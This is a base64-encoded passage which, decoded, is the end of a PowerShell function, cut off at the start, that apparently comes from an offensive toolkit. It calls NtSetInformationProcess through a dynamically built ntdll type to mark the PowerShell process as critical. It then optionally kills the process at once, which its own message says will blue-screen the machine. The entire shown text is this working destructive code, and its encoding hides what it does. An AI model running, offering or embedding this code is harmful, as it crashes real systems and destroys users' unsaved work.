CAgICAgICAgICAgICAgW0ludDMyXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbVHlwZVtdXSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbVUludDMyXSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNhbGxpbmdDb252ZW50aW9uXTo6V2luYXBpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0XTo6QXV0bykKCiAgICAkbnRkbGwgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgogICAgJFByb2NIYW5kbGUgPSBbRGlhZ25vc3RpY3MuUHJvY2Vzc106OkdldEN1cnJlbnRQcm9jZXNzKCkuSGFuZGxlCiAgICAkUmV0dXJuUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKDQpCgogICAgJFByb2Nlc3NCcmVha09uVGVybWluYXRpb24gPSAyOQogICAgJFNpemVVSW50MzIgPSA0CgogICAgdHJ5CiAgICB7CiAgICAgICAgJG51bGwgPSAkbnRkbGw6Ok50U2V0SW5mb3JtYXRpb25Qcm9jZXNzKCRQcm9jSGFuZGxlLCAkUHJvY2Vzc0JyZWFrT25UZXJtaW5hdGlvbiwgW1JlZl0gJFJldHVyblB0ciwgJFNpemVVSW50MzIpCiAgICB9CiAgICBjYXRjaAogICAgewogICAgICAgIHJldHVybgogICAgfQoKICAgIFdyaXRlLVZlcmJvc2UgJ1Bvd2VyU2hlbGwgaXMgbm93IG1hcmtlZCBhcyBhIGNyaXRpY2FsIHByb2Nlc3MgYW5kIHdpbGwgYmx1ZSBzY3JlZW4gdGhlIG1hY2hpbmUgdXBvbiBleGl0aW5nIHRoZSBwcm9jZXNzLicKCiAgICBpZiAoJEV4aXRJbW1lZGlhdGVseSkKICAgIHsKICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRQSUQKICAgIH0KfQo=
